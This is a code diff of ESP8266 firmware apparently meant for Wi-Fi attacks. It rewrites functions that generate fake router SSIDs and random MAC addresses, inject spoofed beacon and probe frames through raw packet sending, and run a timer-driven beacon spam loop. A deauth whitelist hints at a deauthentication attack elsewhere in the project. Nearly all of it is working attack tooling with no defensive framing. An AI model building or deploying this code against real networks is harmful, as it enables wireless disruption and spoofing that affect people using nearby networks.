@@ -5,7 +5,6 @@
 #include <user_interface.h>
 #include <queue.h>
 
-
 #include "user_config.h"
 #include "user_packets.h"
 #include "user_attack.h"
@@ -21,13 +20,60 @@
 // Features
 static os_timer_t timer;
 static uint8_t current_channel;
+static uint8_t random_mac[6];
+
+// Beacon features
+static struct fake_router_info *spam_beacon = NULL;
 SLIST_HEAD(fake_router_info_head, fake_router_info) router_list;
-static uint8_t random_mac[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };
+
+// Deauth features
 static uint8_t macs_white_list[2][MAC_ADDR_LEN] =
 {
     { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
     { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
 };
+
+
+/******************************************************************************
+ * Fake SSID generator
+ *******************************************************************************/
+void ICACHE_FLASH_ATTR
+pick_fake_ssid(uint8_t *buf)
+{
+    uint8_t pick = os_random() % (TOTAL_FAKE_SSID - 1);
+    os_sprintf(buf, fake_ssid[pick], 1 + (os_random() % 98));
+}
+
+/******************************************************************************
+ * Feed fake router list
+ *******************************************************************************/
+void ICACHE_FLASH_ATTR
+feed_fake_routers(void)
+{
+    uint8_t i, buf[MAX_SSID_LEN];
+
+    // Init fake routers list
+    SLIST_INIT(&router_list);
+
+    // Feed fake routers list
+    for(i = 0; i < FAKE_NETWORKS; ++i)
+    {
+        struct fake_router_info *info = NULL;
+        info = (struct fake_router_info *) os_malloc(sizeof(struct fake_router_info));
+
+        // SSID
+        os_memset(buf, 0, MAX_SSID_LEN);
+        pick_fake_ssid(buf);
+        os_memcpy(&info->ssid, buf, os_strlen(buf) + 1);
+
+        // MAC
+        random_mac[5] = (i + 1);
+        os_memcpy(&info->bssid, random_mac, MAC_ADDR_LEN);
+
+        SLIST_INSERT_HEAD(&router_list, info, next);
+        spam_beacon = info;
+    }
+}
 
 /******************************************************************************
  * Send packet (no socket, through PHY)
@@ -38,8 +84,10 @@ send_packet(uint8_t* packet, uint16_t packet_size, uint16_t repeat)
     // Send
     uint8_t i = 0;
     for (i = 0; i < repeat; i++)
+    {
         wifi_send_pkt_freedom(packet, packet_size, 0);
-
+        os_delay_us(1000);
+    }
 }
 
 /******************************************************************************
@@ -101,7 +149,7 @@ attack_probe(const char* ssid, uint8_t channel)
     os_memcpy(&probe_packet[26], ssid, ssid_len);
 
     // Send
-    send_packet(probe_packet, packet_size, 2);
+    send_packet(probe_packet, packet_size, 3);
 }
 
 /******************************************************************************
@@ -123,64 +171,24 @@ attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2)
         packet_size -= 26;
     }
 
+    // MAC
+    os_memcpy(&beacon_packet[10], mac, MAC_ADDR_LEN);
+    os_memcpy(&beacon_packet[16], mac, MAC_ADDR_LEN);
+
     // SSID
     int ssid_len = os_strlen(ssid);
     if (ssid_len > MAX_SSID_LEN)
         ssid_len = MAX_SSID_LEN;
 
-    os_memcpy(&beacon_packet[10], mac, MAC_ADDR_LEN);
-    os_memcpy(&beacon_packet[16], mac, MAC_ADDR_LEN);
+    // SSID len will be always 32
     os_memset(&beacon_packet[38], ' ', MAX_SSID_LEN);
     os_memcpy(&beacon_packet[38], ssid, ssid_len);
 
     // Channel
     beacon_packet[82] = channel;
-    // SSID Len
-    beacon_packet[37] = ssid_len;
 
     // Send
-    send_packet(beacon_packet, packet_size, 2);
-}
-
-
-/******************************************************************************
- * Fake SSID generator
- *******************************************************************************/
-void ICACHE_FLASH_ATTR
-pick_fake_ssid(uint8_t *buf)
-{
-    uint8_t pick = os_random() % (TOTAL_FAKE_SSID - 1);
-    os_sprintf(buf, fake_ssid[pick], os_random() % 999);
-}
-
-/******************************************************************************
- * Feed fake router list
- *******************************************************************************/
-void ICACHE_FLASH_ATTR
-feed_fake_routers(void)
-{
-    uint8_t i, len, buf[MAX_SSID_LEN];
-
-    // Init fake routers list
-    SLIST_INIT(&router_list);
-
-    // Feed fake routers list
-    for(i = 0; i < FAKE_NETWORKS; ++i)
-    {
-        // Save fake router
-        struct fake_router_info *info = NULL;
-        info = (struct fake_router_info *) os_malloc(sizeof(struct fake_router_info));
-
-        os_memset(buf, 0, MAX_SSID_LEN);
-        pick_fake_ssid(buf);
-        os_memcpy(&info->ssid, &buf[0], os_strlen(buf) + 1);
-
-        os_memset(buf, 0, MAX_SSID_LEN);
-        user_get_random_mac(buf);
-        os_memcpy(&info->bssid, &buf[0], MAC_ADDR_LEN);
-
-        SLIST_INSERT_HEAD(&router_list, info, next);
-    }
+    send_packet(beacon_packet, packet_size, 3);
 }
 
 /******************************************************************************
@@ -189,10 +197,14 @@ feed_fake_routers(void)
 void ICACHE_FLASH_ATTR
 user_beacon_timer_cb(uint32_t millis)
 {
-   // Beacons
-   struct fake_router_info *router_info = NULL;
-   SLIST_FOREACH(router_info, &router_list, next)
-        attack_beacon(router_info->bssid, router_info->ssid, current_channel, TRUE);
+    // Spam beacon
+    spam_beacon = SLIST_NEXT(spam_beacon, next);
+    if(spam_beacon == NULL)
+        spam_beacon = SLIST_FIRST(&router_list);
+    attack_beacon(spam_beacon->bssid, spam_beacon->ssid, current_channel, TRUE);
+
+   // Schedule next
+   os_timer_arm(&timer, BEACON_SPAM_DELAY, 0);
 }
 
 /******************************************************************************
@@ -201,6 +213,7 @@ user_beacon_timer_cb(uint32_t millis)
 void user_attack_set_channel(uint8_t channel)
 {
     current_channel = channel;
+    user_get_random_mac(random_mac);
 }
 
 /******************************************************************************
@@ -211,10 +224,11 @@ user_attacks_init(uint8_t channel)
 {
    // Setups
    current_channel = channel;
+   user_get_random_mac(random_mac);
    feed_fake_routers();
 
-   // Beacon timer
+   // Beacon spam timer
    os_timer_disarm(&timer);
    os_timer_setfn(&timer, (os_timer_func_t*) &user_beacon_timer_cb, 0);
-   os_timer_arm(&timer, BEACON_DELAY, 1);
+   os_timer_arm(&timer, BEACON_SPAM_DELAY, 0);
 }
